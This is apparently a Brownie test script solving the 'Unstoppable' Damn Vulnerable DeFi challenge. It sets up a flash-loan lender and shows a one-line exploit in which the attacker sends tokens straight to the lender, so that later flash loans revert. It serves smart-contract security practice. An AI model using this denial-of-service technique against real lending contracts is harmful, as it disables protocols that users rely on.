from brownie import (
    exceptions,
    UnstoppableLender,
    DamnValuableToken,
    ReceiverUnstoppable,
)
from web3 import Web3
from scripts.utils import get_account
import pytest

TOKENS_IN_POOL = Web3.toWei("1000000", "ether")
INITIAL_ATTACKER_BALANCE = Web3.toWei("100", "ether")


def before():
    # set up contracts
    deployer = get_account(0)
    attacker = get_account(1)
    randomUser = get_account(2)
    dvt_token = DamnValuableToken.deploy({"from": deployer})
    lender = UnstoppableLender.deploy(dvt_token.address, {"from": deployer})

    # approve lender for deployer
    dvt_token.approve(lender.address, TOKENS_IN_POOL, {"from": deployer})
    # setup lender with 1,000,000 DVT
    lender.depositTokens(TOKENS_IN_POOL, {"from": deployer})
    # setup attacker with 100 DVT
    dvt_token.transfer(attacker.address, INITIAL_ATTACKER_BALANCE, {"from": deployer})

    assert dvt_token.balanceOf(lender.address) == TOKENS_IN_POOL
    assert dvt_token.balanceOf(attacker.address) == INITIAL_ATTACKER_BALANCE

    # assert random user can execute flashloan
    receiver = ReceiverUnstoppable.deploy(lender.address, {"from": randomUser})
    receiver.executeFlashLoan(10, {"from": randomUser})


def run_exploit():
    attacker = get_account(1)
    DamnValuableToken[0].transfer(
        UnstoppableLender[0].address, Web3.toWei(1, "ether"), {"from": attacker}
    )


def after():
    randomUser = get_account(2)
    with pytest.raises(exceptions.VirtualMachineError):
        ReceiverUnstoppable[0].executeFlashLoan(10, {"from": randomUser})


def test_unstoppable_challenge():
    before()
    run_exploit()
    after()